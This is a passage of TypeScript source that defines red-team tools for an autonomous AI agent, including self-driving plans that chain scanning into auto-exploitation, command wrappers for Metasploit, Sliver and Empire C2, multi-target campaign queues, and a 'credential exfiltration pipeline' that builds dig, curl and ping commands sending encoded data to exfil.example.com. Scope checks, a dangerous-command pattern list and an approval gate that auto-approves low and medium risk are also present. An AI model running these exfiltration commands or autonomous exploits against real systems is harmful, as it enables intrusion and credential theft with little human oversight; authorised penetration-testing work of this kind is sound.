							createdAt: plan.createdAt,
							updatedAt: Date.now(),
						});
					} catch {
						/* ignore */
					}
				}

				return {
					planId: id,
					status: plan.status,
					executed: executed.length,
					results: executed,
					message: `Plan auto-executed. ${executed.length} steps completed. ${plan.steps.filter((s) => s.status === "pending").length} remaining.`,
				};
			},
		}) as AgentTool,
	);

	const PlanListSchema = z.object({});
	tools.push(
		createTool<
			Record<string, never>,
			{
				plans: {
					id: string;
					goal: string;
					target: string;
					status: string;
					progress: string;
				}[];
			}
		>({
			name: "rt_plan_list",
			description: "List all plans.",
			inputSchema: zodToJsonSchema(PlanListSchema),
			execute: async () => {
				const list = [...plans.values()].map((p) => ({
					id: p.id,
					goal: p.goal,
					target: p.target,
					status: p.status,
					progress: `${p.steps.filter((s) => s.status === "done").length}/${p.steps.length}`,
				}));
				return { plans: list };
			},
		}) as AgentTool,
	);

	// --- Self-driving execution ---

	const PlanDriveSchema = z.object({
		planId: z.string().min(1),
		autoExecute: z.boolean().optional(),
	});
	tools.push(
		createTool<
			{ planId: string; autoExecute?: boolean },
			{
				status: string;
				currentStep: PlanStep | null;
				executed: { stepId: string; action: string; result: unknown }[];
				remaining: number;
				message: string;
			}
		>({
			name: "rt_plan_drive",
			description:
				"Self-driving plan execution: automatically executes all pending steps in sequence. Returns results and next pending step.",
			inputSchema: zodToJsonSchema(PlanDriveSchema),
			execute: async (input) => {
				const v = validateWithZod(PlanDriveSchema, input);
				const plan = plans.get(v.planId);
				if (!plan)
					return {
						status: "not_found",
						currentStep: null,
						executed: [],
						remaining: 0,
						message: "Plan not found",
					};

				const executed: { stepId: string; action: string; result: unknown }[] =
					[];
				const autoExec = v.autoExecute !== false;

				// Build dispatch map
				const dispatch: Record<
					string,
					(args: Record<string, unknown>) => Promise<unknown>
				> = {};
				for (const t of tools) {
					const tool = t as unknown as {
						name: string;
						execute: (input: unknown) => Promise<unknown>;
					};
					dispatch[tool.name] = (args) => tool.execute(args);
				}

				// Execute all pending steps
				let hasMore = true;
				while (hasMore && autoExec) {
					const step = plan.steps.find((s) => s.status === "pending");
					if (!step) {
						hasMore = false;
						break;
					}

					step.status = "running";
					try {
						const fn = dispatch[step.action];
						if (!fn) {
							step.status = "skipped";
							step.result = `Tool ${step.action} not available`;
							continue;
						}
						// Build args from target
						const args: Record<string, unknown> = { target: plan.target };
						if (step.action === "rt_subfinder") args.domain = plan.target;
						if (step.action === "rt_nmap") args.target = plan.target;
						if (step.action === "rt_httpx") args.input = plan.target;
						if (step.action === "rt_whatweb") args.target = plan.target;
						if (step.action === "rt_wafw00f") args.target = plan.target;
						if (step.action === "rt_vuln_templates")
							args.url = `https://${plan.target}`;
						if (step.action === "rt_nuclei") args.target = plan.target;
						if (step.action === "rt_auto_exploit")
							args.url = `https://${plan.target}`;
						if (step.action === "rt_report_gen") {
							args.title = `Pentest Report: ${plan.target}`;
							args.findings = [];
						}

						const result = await fn(args);
						step.status = "done";
						step.result = JSON.stringify(result).slice(0, 500);
						executed.push({ stepId: step.id, action: step.action, result });

						// Branching: if nmap found web ports, add web vuln scan
						if (
							step.action === "rt_nmap" &&
							typeof result === "object" &&
							result !== null
						) {
							const r = result as { stdout?: string };
							if (
								r.stdout?.includes("80/tcp") ||
								r.stdout?.includes("443/tcp") ||
								r.stdout?.includes("8080/tcp")
							) {
								const webStep: PlanStep = {
									id: `s_web_${Date.now()}`,
									action: "rt_vuln_templates",
									description: `Web vuln scan ${plan.target} (auto-added: web port found)`,
									status: "pending",
								};
								plan.steps.push(webStep);
							}
						}
						// Branching: if vuln scan found issues, add exploit step
						if (
							step.action === "rt_vuln_templates" &&
							typeof result === "object" &&
							result !== null
						) {
							const r = result as { findings?: unknown[] };
							if (r.findings && r.findings.length > 0) {
								const exploitStep: PlanStep = {
									id: `s_exploit_${Date.now()}`,
									action: "rt_auto_exploit",
									description: `Auto-exploit ${plan.target} (auto-added: vulns found)`,
									status: "pending",
								};
								plan.steps.push(exploitStep);
							}
						}
					} catch (e: unknown) {
						step.status = "failed";
						step.result = String(e);
						executed.push({
							stepId: step.id,
							action: step.action,
							result: { error: String(e) },
						});
					}
				}

				// Check completion
				if (
					plan.steps.every((s) => s.status === "done" || s.status === "skipped")
				) {
					plan.status = "completed";
				} else if (
					plan.steps.every(
						(s) => s.status !== "pending" && s.status !== "running",
					)
				) {
					plan.status = plan.steps.some((s) => s.status === "failed")
						? "completed_with_failures"
						: "completed";
				}

				// Auto-generate report when plan completes
				if (
					plan.status === "completed" ||
					plan.status === "completed_with_failures"
				) {
					const reportLines = [];
					reportLines.push("# Pentest Report: " + plan.target);
					reportLines.push("**Date:** " + new Date().toISOString());
					reportLines.push("**Goal:** " + plan.goal);
					reportLines.push("**Status:** " + plan.status);
					reportLines.push("");
					reportLines.push("## Steps Executed");
					for (const step of plan.steps) {
						reportLines.push(
							"- [" +
								step.status +
								"] " +
								step.action +
								": " +
								step.description,
						);
						if (step.result)
							reportLines.push("  Result: " + step.result.slice(0, 200));
					}
					reportLines.push("");
					reportLines.push("## Evidence");
					for (const e of executed) {
						reportLines.push("### " + e.stepId + " (" + e.action + ")");
						reportLines.push("```");
						reportLines.push(JSON.stringify(e.result, null, 2).slice(0, 500));
						reportLines.push("```");
					}
					const { mkdirSync, writeFileSync } = await import("node:fs");
					try {
						mkdirSync("reports", { recursive: true });
					} catch {
						/* ignore */
					}
					const filename =
						"reports/report-" +
						plan.target.replace(/[^a-zA-Z0-9]/g, "_") +
						"-" +
						Date.now() +
						".md";
					writeFileSync(filename, reportLines.join("\n"));
					executed.push({
						stepId: "auto_report",
						action: "rt_report_gen",
						result: { file: filename, persisted: true },
					});
				}

				const nextStep = plan.steps.find((s) => s.status === "pending") ?? null;
				const remaining = plan.steps.filter(
					(s) => s.status === "pending",
				).length;

				return {
					status: plan.status,
					currentStep: nextStep,
					executed,
					remaining,
					message:
						remaining === 0
							? `Plan completed. ${executed.length} steps executed.`
							: `${executed.length} steps executed. ${remaining} remaining. Call rt_plan_drive again to continue.`,
				};
			},
		}) as AgentTool,
	);

	// --- Docker/Kali integration ---

	const dockerMiddleware = docker ?? new DockerMiddleware();

	tools.push(
		createTool<
			Record<string, never>,
			{ running: boolean; container: string; image: string; tools: string[] }
		>({
			name: "rt_docker_status",
			description: "Check Docker/Kali container status and available tools.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => dockerMiddleware.status(),
		}) as AgentTool,
	);

	const DockerExecSchema = z.object({
		command: z.string().min(1),
		timeoutMs: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ command: string; timeoutMs?: number },
			{ stdout: string; stderr: string; code: number }
		>({
			name: "rt_docker_exec",
			description: "Execute a command inside the Kali Docker container.",
			inputSchema: zodToJsonSchema(DockerExecSchema),
			execute: async (input) => {
				const v = validateWithZod(DockerExecSchema, input);
				return dockerMiddleware.execInContainer(v.command, v.timeoutMs);
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { success: boolean; message: string }>({
			name: "rt_docker_setup",
			description: "Set up Kali Docker container with red team tools.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => dockerMiddleware.setup(),
		}) as AgentTool,
	);

	const DockerEnableSchema = z.object({ enabled: z.boolean() });
	tools.push(
		createTool<{ enabled: boolean }, { enabled: boolean }>({
			name: "rt_docker_enable",
			description: "Enable/disable Docker mode (run tools in Kali container).",
			inputSchema: zodToJsonSchema(DockerEnableSchema),
			execute: async (input) => {
				const v = validateWithZod(DockerEnableSchema, input);
				if (v.enabled) {
					const ok = await dockerMiddleware.enable();
					return { enabled: ok };
				}
				await dockerMiddleware.disable();
				return { enabled: false };
			},
		}) as AgentTool,
	);

	// --- External framework integration ---

	const FrameworkSchema = z.object({
		framework: z.enum(["metasploit", "cobalt_strike", "sliver", "empire"]),
		command: z.string().optional(),
		args: z.string().optional(),
	});

	tools.push(
		createTool<
			{ framework: string; command?: string; args?: string },
			{ output: string; code: number; command: string }
		>({
			name: "rt_framework",
			description:
				"Run a command in an external C2/exploitation framework (metasploit, cobalt_strike, sliver, empire) via Docker/Kali.",
			inputSchema: zodToJsonSchema(FrameworkSchema),
			execute: async (input) => {
				const v = validateWithZod(FrameworkSchema, input);
				let cmd = "";
				switch (v.framework) {
					case "metasploit":
						cmd = v.command
							? `msfconsole -q -x "${v.command}"`
							: "msfconsole -q";
						break;
					case "cobalt_strike":
						cmd = v.command
							? `./teamserver ${v.args ?? ""} ${v.command}`
							: "echo 'Cobalt Strike requires manual setup'";
						break;
					case "sliver":
						cmd = v.command
							? `sliver-server -c "${v.command}"`
							: "sliver-server";
						break;
					case "empire":
						cmd = v.command
							? `python3 empire.py --headless --command "${v.command}"`
							: "python3 empire.py --headless";
						break;
				}
				const fullCmd = `docker exec kali-redteam bash -c ${JSON.stringify(cmd)}`;
				if (killed) return { output: "killed", code: -1, command: fullCmd };
				if (dryRunMode)
					return { output: "[dry-run]", code: 0, command: fullCmd };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(fullCmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { output: stdout.slice(0, 100000), code: 0, command: fullCmd };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						output: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
						command: fullCmd,
					};
				}
			},
		}) as AgentTool,
	);

	// Framework setup tools
	const FrameworkSetupSchema = z.object({
		framework: z.enum(["metasploit", "cobalt_strike", "sliver", "empire"]),
	});
	tools.push(
		createTool<
			{ framework: string },
			{ success: boolean; message: string; installCmd: string }
		>({
			name: "rt_framework_setup",
			description: "Install a C2/exploitation framework in the Kali container.",
			inputSchema: zodToJsonSchema(FrameworkSetupSchema),
			execute: async (input) => {
				const v = validateWithZod(FrameworkSetupSchema, input);
				const installCmds: Record<string, string> = {
					metasploit: "apt-get install -y metasploit-framework",
					cobalt_strike:
						"echo 'Cobalt Strike requires manual download from https://www.cobaltstrike.com'",
					sliver: "curl -s https://sliver.sh/install | bash",
					empire:
						"git clone https://github.com/BC-SECURITY/Empire.git /opt/Empire && cd /opt/Empire && pip3 install -r requirements.txt",
				};
				const cmd = installCmds[v.framework];
				if (killed)
					return { success: false, message: "killed", installCmd: cmd };
				if (dryRunMode)
					return { success: true, message: "[dry-run]", installCmd: cmd };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const fullCmd = `docker exec kali-redteam bash -c ${JSON.stringify(cmd)}`;
					const { stdout } = await promisify(exec)(fullCmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return {
						success: true,
						message: stdout.slice(0, 1000),
						installCmd: cmd,
					};
				} catch (e: unknown) {
					const err = e as { stdout?: string; message?: string };
					return {
						success: false,
						message: (err.stdout ?? err.message ?? String(e)).slice(0, 1000),
						installCmd: cmd,
					};
				}
			},
		}) as AgentTool,
	);

	// Metasploit specific
	tools.push(
		createTool<
			{ module: string; options?: Record<string, string> },
			{ command: string; output: string }
		>({
			name: "rt_metasploit",
			description: "Run a Metasploit module with options.",
			inputSchema: zodToJsonSchema(
				z.object({
					module: z.string().min(1),
					options: z.record(z.string(), z.string()).optional(),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						module: z.string().min(1),
						options: z.record(z.string(), z.string()).optional(),
					}),
					input,
				);
				const opts = Object.entries(v.options ?? {})
					.map(([k, val]) => `set ${k} ${val}`)
					.join("; ");
				const cmd = `msfconsole -q -x "use ${v.module}; ${opts}; run; exit"`;
				const fullCmd = `docker exec kali-redteam bash -c ${JSON.stringify(cmd)}`;
				if (killed) return { command: fullCmd, output: "killed" };
				if (dryRunMode) return { command: fullCmd, output: "[dry-run]" };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(fullCmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: fullCmd, output: stdout.slice(0, 100000) };
				} catch (e: unknown) {
					const err = e as { stdout?: string };
					return {
						command: fullCmd,
						output: (err.stdout ?? "").slice(0, 100000),
					};
				}
			},
		}) as AgentTool,
	);

	// Sliver specific
	tools.push(
		createTool<{ command: string }, { command: string; output: string }>({
			name: "rt_sliver",
			description: "Run a Sliver C2 command.",
			inputSchema: zodToJsonSchema(z.object({ command: z.string().min(1) })),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ command: z.string().min(1) }),
					input,
				);
				const cmd = `sliver-server -c "${v.command}"`;
				const fullCmd = `docker exec kali-redteam bash -c ${JSON.stringify(cmd)}`;
				if (killed) return { command: fullCmd, output: "killed" };
				if (dryRunMode) return { command: fullCmd, output: "[dry-run]" };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(fullCmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: fullCmd, output: stdout.slice(0, 100000) };
				} catch (e: unknown) {
					const err = e as { stdout?: string };
					return {
						command: fullCmd,
						output: (err.stdout ?? "").slice(0, 100000),
					};
				}
			},
		}) as AgentTool,
	);

	// Empire specific
	tools.push(
		createTool<{ command: string }, { command: string; output: string }>({
			name: "rt_empire",
			description: "Run an Empire C2 command.",
			inputSchema: zodToJsonSchema(z.object({ command: z.string().min(1) })),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ command: z.string().min(1) }),
					input,
				);
				const cmd = `python3 /opt/Empire/empire.py --headless --command "${v.command}"`;
				const fullCmd = `docker exec kali-redteam bash -c ${JSON.stringify(cmd)}`;
				if (killed) return { command: fullCmd, output: "killed" };
				if (dryRunMode) return { command: fullCmd, output: "[dry-run]" };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(fullCmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: fullCmd, output: stdout.slice(0, 100000) };
				} catch (e: unknown) {
					const err = e as { stdout?: string };
					return {
						command: fullCmd,
						output: (err.stdout ?? "").slice(0, 100000),
					};
				}
			},
		}) as AgentTool,
	);

	// --- Scope enforcement in executors ---
	// Wrap rt_exec to enforce scope before execution
	const originalExecIndex = tools.findIndex(
		(t) => (t as { name?: string }).name === "rt_exec",
	);
	if (originalExecIndex >= 0) {
		const originalExec = tools[originalExecIndex] as unknown as {
			execute: (input: unknown) => Promise<unknown>;
		};
		const wrappedExec = {
			...originalExec,
			execute: async (input: unknown) => {
				const inp = input as { command?: string; target?: string };
				if (inp.target) {
					const t = inp.target.toLowerCase();
					const inScope =
						scopeAllowlist.size === 0 ||
						scopeAllowlist.has(t) ||
						[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
					if (!inScope) {
						return {
							stdout: "",
							stderr: "BLOCKED: target out of scope",
							code: -1,
							hash: "",
							dryRun: false,
							aborted: false,
							outOfScope: true,
						};
					}
				}
				if (killed) {
					return {
						stdout: "",
						stderr: "BLOCKED: kill switch active",
						code: -1,
						hash: "",
						dryRun: false,
						aborted: true,
						outOfScope: false,
					};
				}
				return originalExec.execute(input);
			},
		};
		tools[originalExecIndex] = wrappedExec as unknown as AgentTool;
	}

	// --- Supervisor (dual-agent) ---
	const supervisors = new Map<string, Supervisor>();
	const SupervisorCreateSchema = z.object({
		target: z.string().min(1),
		maxActions: z.number().int().optional(),
	});
	tools.push(
		createTool<
			{ target: string; maxActions?: number },
			{ supervisorId: string; state: ReturnType<Supervisor["getState"]> }
		>({
			name: "rt_supervisor_create",
			description:
				"Create a supervisor for dual-agent attack orchestration (state machine: recon → scan → exploit → postex → report).",
			inputSchema: zodToJsonSchema(SupervisorCreateSchema),
			execute: async (input) => {
				const v = validateWithZod(SupervisorCreateSchema, input);
				const id = `sup_${Date.now()}`;
				const sup = new Supervisor({
					taskId: id,
					target: v.target,
					maxActions: v.maxActions,
				});
				supervisors.set(id, sup);
				return { supervisorId: id, state: sup.getState() };
			},
		}) as AgentTool,
	);

	const SupervisorNextSchema = z.object({ supervisorId: z.string().min(1) });
	tools.push(
		createTool<
			{ supervisorId: string },
			{
				actions: string[];
				stage: string;
				canContinue: boolean;
				summary: string;
			}
		>({
			name: "rt_supervisor_next",
			description: "Get next actions from supervisor based on current stage.",
			inputSchema: zodToJsonSchema(SupervisorNextSchema),
			execute: async (input) => {
				const v = validateWithZod(SupervisorNextSchema, input);
				const sup = supervisors.get(v.supervisorId);
				if (!sup)
					return {
						actions: [],
						stage: "not_found",
						canContinue: false,
						summary: "Supervisor not found",
					};
				return {
					actions: sup.getNextActions(),
					stage: sup.getCurrentStage(),
					canContinue: sup.canContinue(),
					summary: sup.getSummary(),
				};
			},
		}) as AgentTool,
	);

	const SupervisorRecordSchema = z.object({
		supervisorId: z.string().min(1),
		action: z.string().min(1),
		result: z.unknown(),
	});
	tools.push(
		createTool<
			{ supervisorId: string; action: string; result: unknown },
			{ recorded: boolean; advanced: boolean; newStage: string }
		>({
			name: "rt_supervisor_record",
			description:
				"Record an action result in the supervisor. Auto-advances stage if complete.",
			inputSchema: zodToJsonSchema(SupervisorRecordSchema),
			execute: async (input) => {
				const v = validateWithZod(SupervisorRecordSchema, input);
				const sup = supervisors.get(v.supervisorId);
				if (!sup)
					return { recorded: false, advanced: false, newStage: "not_found" };
				sup.recordAction(v.action, v.result);
				const adv = sup.autoAdvance();
				return {
					recorded: true,
					advanced: adv !== null,
					newStage: adv?.newStage ?? sup.getCurrentStage(),
				};
			},
		}) as AgentTool,
	);

	const SupervisorStatusSchema = z.object({ supervisorId: z.string().min(1) });
	tools.push(
		createTool<
			{ supervisorId: string },
			{ state: ReturnType<Supervisor["getState"]> | null }
		>({
			name: "rt_supervisor_status",
			description:
				"Get supervisor state (stage, assets, findings, creds, progress).",
			inputSchema: zodToJsonSchema(SupervisorStatusSchema),
			execute: async (input) => {
				const v = validateWithZod(SupervisorStatusSchema, input);
				const sup = supervisors.get(v.supervisorId);
				return { state: sup ? sup.getState() : null };
			},
		}) as AgentTool,
	);

	// --- Command filter (7-layer defense) ---
	const cmdFilter = new CommandFilter();
	tools.push(
		createTool<
			{ command: string; target?: string },
			{
				allowed: boolean;
				reason: string;
				filteredCommand: string;
				layer: string;
			}
		>({
			name: "rt_cmd_filter",
			description:
				"Check a command against 7-layer defense (dangerous patterns, scope, volume ceiling, credential sanitization).",
			inputSchema: zodToJsonSchema(
				z.object({ command: z.string().min(1), target: z.string().optional() }),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						command: z.string().min(1),
						target: z.string().optional(),
					}),
					input,
				);
				return cmdFilter.check(v.command, v.target);
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<{ targets: string[] }, { set: boolean }>({
			name: "rt_cmd_filter_scope",
			description: "Set the scope allowlist for the command filter.",
			inputSchema: zodToJsonSchema(
				z.object({ targets: z.array(z.string().min(1)) }),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ targets: z.array(z.string().min(1)) }),
					input,
				);
				cmdFilter.setAllowlist(v.targets);
				return { set: true };
			},
		}) as AgentTool,
	);

	// --- Campaign manager (multi-target) ---
	const campaignManager = new CampaignManager();
	tools.push(
		createTool<
			{
				name: string;
				targets: { value: string; type: string }[];
				maxParallel?: number;
			},
			{ campaign: ReturnType<CampaignManager["createCampaign"]> }
		>({
			name: "rt_campaign_create",
			description: "Create a multi-target campaign for parallel execution.",
			inputSchema: zodToJsonSchema(
				z.object({
					name: z.string().min(1),
					targets: z.array(
						z.object({ value: z.string().min(1), type: z.string().min(1) }),
					),
					maxParallel: z.number().int().optional(),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						name: z.string().min(1),
						targets: z.array(
							z.object({ value: z.string().min(1), type: z.string().min(1) }),
						),
						maxParallel: z.number().int().optional(),
					}),
					input,
				);
				return {
					campaign: campaignManager.createCampaign(
						v.name,
						v.targets,
						v.maxParallel,
					),
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			{ campaignId: string },
			{ targets: ReturnType<CampaignManager["getNextTargets"]> }
		>({
			name: "rt_campaign_next",
			description:
				"Get next pending targets in a campaign for parallel execution.",
			inputSchema: zodToJsonSchema(z.object({ campaignId: z.string().min(1) })),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ campaignId: z.string().min(1) }),
					input,
				);
				return { targets: campaignManager.getNextTargets(v.campaignId) };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			{ campaignId: string },
			{ coverage: ReturnType<CampaignManager["getCoverage"]> }
		>({
			name: "rt_campaign_coverage",
			description:
				"Get campaign coverage (total/completed/failed/pending/running/findings).",
			inputSchema: zodToJsonSchema(z.object({ campaignId: z.string().min(1) })),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ campaignId: z.string().min(1) }),
					input,
				);
				return { coverage: campaignManager.getCoverage(v.campaignId) };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			{ campaignId: string },
			{ findings: ReturnType<CampaignManager["getConsolidatedFindings"]> }
		>({
			name: "rt_campaign_findings",
			description:
				"Get consolidated findings across all targets in a campaign.",
			inputSchema: zodToJsonSchema(z.object({ campaignId: z.string().min(1) })),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ campaignId: z.string().min(1) }),
					input,
				);
				return {
					findings: campaignManager.getConsolidatedFindings(v.campaignId),
				};
			},
		}) as AgentTool,
	);

	// --- 7-Layer Defense-in-Depth ---

	// Layer 1+2+6+7: Enhanced rt_exec with auto scope check, output sanitization, volume ceiling
	const origExecIdx = tools.findIndex(
		(t) => (t as { name?: string }).name === "rt_exec",
	);
	if (origExecIdx >= 0) {
		const origExec = tools[origExecIdx] as unknown as {
			execute: (input: unknown) => Promise<unknown>;
			name: string;
			description: string;
			inputSchema: unknown;
		};
		const enhancedExec = {
			...origExec,
			execute: async (input: unknown) => {
				const inp = input as {
					command?: string;
					target?: string;
					timeoutMs?: number;
				};
				// Layer 1: Command filtering
				if (inp.command) {
					const dangerous = [
						/rm\s+-rf\s+\/(?!\w)/,
						/dd\s+if=.*of=\/dev\//,
						/mkfs\./,
						/:(){ :|:& };:/,
					];
					for (const p of dangerous) {
						if (p.test(inp.command)) {
							return {
								stdout: "",
								stderr: "BLOCKED: dangerous command pattern",
								code: -1,
								hash: "",
								dryRun: false,
								aborted: false,
								outOfScope: false,
							};
						}
					}
				}
				// Layer 2: Scope enforcement
				if (inp.target && scopeAllowlist.size > 0) {
					const t = inp.target.toLowerCase();
					const inScope =
						scopeAllowlist.has(t) ||
						[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
					if (!inScope) {
						return {
							stdout: "",
							stderr: "BLOCKED: target out of scope",
							code: -1,
							hash: "",
							dryRun: false,
							aborted: false,
							outOfScope: true,
						};
					}
				}
				// Layer 7: Volume ceiling
				if (actionCount >= 1000) {
					return {
						stdout: "",
						stderr: "BLOCKED: volume ceiling reached",
						code: -1,
						hash: "",
						dryRun: false,
						aborted: false,
						outOfScope: false,
					};
				}
				actionCount++;

				// Execute
				const result = (await origExec.execute(input)) as {
					stdout: string;
					stderr: string;
					code: number;
					hash: string;
				};

				// Layer 6: Output sanitization (redact credentials)
				if (result.stdout) {
					result.stdout = result.stdout.replace(
						/password[=:]\S+/gi,
						"password=***",
					);
					result.stdout = result.stdout.replace(/token[=:]\S+/gi, "token=***");
					result.stdout = result.stdout.replace(
						/secret[=:]\S+/gi,
						"secret=***",
					);
					result.stdout = result.stdout.replace(
						/api[_-]?key[=:]\S+/gi,
						"api_key=***",
					);
				}

				// Layer 5: Credential exclusion (log only hashes, not raw creds)
				auditLog.push({
					ts: Date.now(),
					target: inp.target,
					command: inp.command ?? "",
					hash: result.hash,
					code: result.code,
				});

				return result;
			},
		};
		tools[origExecIdx] = enhancedExec as AgentTool;
	}

	// Layer 4: Sandbox isolation tool
	tools.push(
		createTool<
			{ command: string; timeoutMs?: number },
			{ stdout: string; stderr: string; code: number; sandboxed: boolean }
		>({
			name: "rt_sandbox_exec",
			description:
				"Execute a command in an isolated Docker sandbox (no network, read-only fs).",
			inputSchema: zodToJsonSchema(
				z.object({
					command: z.string().min(1),
					timeoutMs: z.number().int().optional(),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						command: z.string().min(1),
						timeoutMs: z.number().int().optional(),
					}),
					input,
				);
				const cmd = `docker run --rm --network none --read-only --tmpfs /tmp:rw,noexec,nosuid,size=64m alpine:latest sh -c ${JSON.stringify(v.command)}`;
				if (killed)
					return { stdout: "killed", stderr: "", code: -1, sandboxed: true };
				if (dryRunMode)
					return { stdout: "[dry-run]", stderr: "", code: 0, sandboxed: true };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout, stderr } = await promisify(exec)(cmd, {
						timeout: v.timeoutMs ?? 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return {
						stdout: stdout.slice(0, 100000),
						stderr: stderr.slice(0, 100000),
						code: 0,
						sandboxed: true,
					};
				} catch (e: unknown) {
					const err = e as { stdout?: string; stderr?: string; code?: number };
					return {
						stdout: (err.stdout ?? "").slice(0, 100000),
						stderr: (err.stderr ?? "").slice(0, 100000),
						code: err.code ?? 1,
						sandboxed: true,
					};
				}
			},
		}) as AgentTool,
	);

	// Layer 3: Human approval gate
	tools.push(
		createTool<
			{
				action: string;
				target: string;
				risk: "low" | "medium" | "high" | "critical";
			},
			{ approved: boolean; reason: string }
		>({
			name: "rt_approval_gate",
			description:
				"Request human approval for a high-risk action. Returns approved/rejected.",
			inputSchema: zodToJsonSchema(
				z.object({
					action: z.string().min(1),
					target: z.string().min(1),
					risk: z.enum(["low", "medium", "high", "critical"]),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						action: z.string().min(1),
						target: z.string().min(1),
						risk: z.enum(["low", "medium", "high", "critical"]),
					}),
					input,
				);
				// In YOLO mode, auto-approve low/medium. High/critical require confirmation.
				if (v.risk === "low" || v.risk === "medium") {
					return { approved: true, reason: "auto-approved (yolo mode)" };
				}
				// High/critical: return pending (agent should ask user)
				return {
					approved: false,
					reason: `requires human approval (risk: ${v.risk})`,
				};
			},
		}) as AgentTool,
	);

	// --- Volume/scale: Target queue ---
	const targetQueue: {
		id: string;
		value: string;
		type: string;
		status: string;
		priority: number;
	}[] = [];
	tools.push(
		createTool<
			{ targets: { value: string; type: string; priority?: number }[] },
			{ queued: number }
		>({
			name: "rt_target_queue",
			description: "Queue multiple targets for parallel processing.",
			inputSchema: zodToJsonSchema(
				z.object({
					targets: z.array(
						z.object({
							value: z.string().min(1),
							type: z.string().min(1),
							priority: z.number().int().optional(),
						}),
					),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						targets: z.array(
							z.object({
								value: z.string().min(1),
								type: z.string().min(1),
								priority: z.number().int().optional(),
							}),
						),
					}),
					input,
				);
				for (const t of v.targets) {
					targetQueue.push({
						id: `tq_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
						value: t.value,
						type: t.type,
						status: "pending",
						priority: t.priority ?? 0,
					});
				}
				targetQueue.sort((a, b) => b.priority - a.priority);
				return { queued: v.targets.length };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<{ count: z.ZodNumber }, { targets: typeof targetQueue }>({
			name: "rt_target_next",
			description:
				"Get next pending targets from the queue for parallel processing.",
			inputSchema: zodToJsonSchema(
				z.object({ count: z.number().int().positive().optional() }),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ count: z.number().int().positive().optional() }),
					input,
				);
				const n = v.count ?? 3;
				const pending = targetQueue
					.filter((t) => t.status === "pending")
					.slice(0, n);
				for (const t of pending) t.status = "running";
				return { targets: pending };
			},
		}) as AgentTool,
	);

	// --- Credential exfiltration pipeline ---
	tools.push(
		createTool<
			{ data: string; method: "dns" | "https" | "icmp" },
			{ command: string; encoded: string }
		>({
			name: "rt_exfil_pipeline",
			description:
				"Generate a credential exfiltration pipeline (encode → fragment → exfil).",
			inputSchema: zodToJsonSchema(
				z.object({
					data: z.string().min(1),
					method: z.enum(["dns", "https", "icmp"] as const),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						data: z.string().min(1),
						method: z.enum(["dns", "https", "icmp"] as const),
					}),
					input,
				);
				const encoded = Buffer.from(v.data).toString("base64");
				const fragments = encoded.match(/.{1,32}/g) ?? [];
				let command = "";
				if (v.method === "dns") {
					command = fragments
						.map((f) => `dig ${f}.exfil.example.com`)
						.join(" && ");
				} else if (v.method === "https") {
					command = `curl -s -X POST https://exfil.example.com/collect -d "${encoded}"`;
				} else {
					command = `ping -c 1 -p ${encoded.slice(0, 32)} exfil.example.com`;
				}
				return { command, encoded };
			},
		}) as AgentTool,
	);

	// --- Cyber range setup ---
	tools.push(
		createTool<Record<string, never>, { commands: string[]; message: string }>({
			name: "rt_cyber_range",
			description:
				"Set up a high-fidelity cyber range with vulnerable targets in Docker.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const commands = [
					"docker network create --driver bridge cyber-range 2>/dev/null || true",
					"docker run -d --name dvwa --network cyber-range -p 8080:80 vulnerables/web-dvwa 2>/dev/null || true",
					"docker run -d --name metasploitable --network cyber-range tleemcjr/metasploitable2 2>/dev/null || true",
					"docker run -d --name juice-shop --network cyber-range -p 3000:3000 bkimminich/juice-shop 2>/dev/null || true",
					"echo 'Cyber range ready: DVWA (8080), Metasploitable, Juice Shop (3000)'",
				];
				return {
					commands,
					message:
						"Cyber range setup commands generated. Run via rt_exec or rt_docker_exec.",
				};
			},
		}) as AgentTool,
	);

	// --- MCP + skills auto-loading ---
	tools.push(
